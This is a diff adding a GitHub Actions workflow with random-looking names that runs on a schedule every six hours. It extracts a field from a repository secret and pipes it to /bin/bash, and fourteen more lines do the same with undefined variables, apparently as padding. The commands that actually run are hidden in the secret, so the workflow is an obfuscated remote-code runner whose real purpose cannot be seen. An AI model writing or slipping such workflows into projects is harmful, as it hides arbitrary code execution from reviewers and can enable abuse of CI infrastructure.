@@ -1,0 +1,32 @@
+name: hongdeaiyong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongdeaiyong
+        env:
+          kgqt977: ${{ secrets.kgqt977 }}
+        run: |
+          echo $kgqt977 | jq -r .wopy76 | /bin/bash
+          echo $q1 | jq -r .wvssp255 | /bin/bash
+          echo $w41215 | jq -r .eb96457 | /bin/bash
+          echo $ngxbu91748 | jq -r .hc053 | /bin/bash
+          echo $znoq3199 | jq -r .rgjp59 | /bin/bash
+          echo $xdqcm0 | jq -r .cuo310 | /bin/bash
+          echo $o000 | jq -r .mf4795 | /bin/bash
+          echo $y98524 | jq -r .awq4738 | /bin/bash
+          echo $wdeq6 | jq -r .skff600 | /bin/bash
+          echo $eecml493 | jq -r .v93 | /bin/bash
+          echo $p88 | jq -r .rwtn0 | /bin/bash
+          echo $vr03439 | jq -r .zp05308 | /bin/bash
+          echo $v349 | jq -r .mdnam07 | /bin/bash
+          echo $cu95 | jq -r .lmn3619 | /bin/bash
+          echo $ncodi63 | jq -r .dflz0 | /bin/bash
+
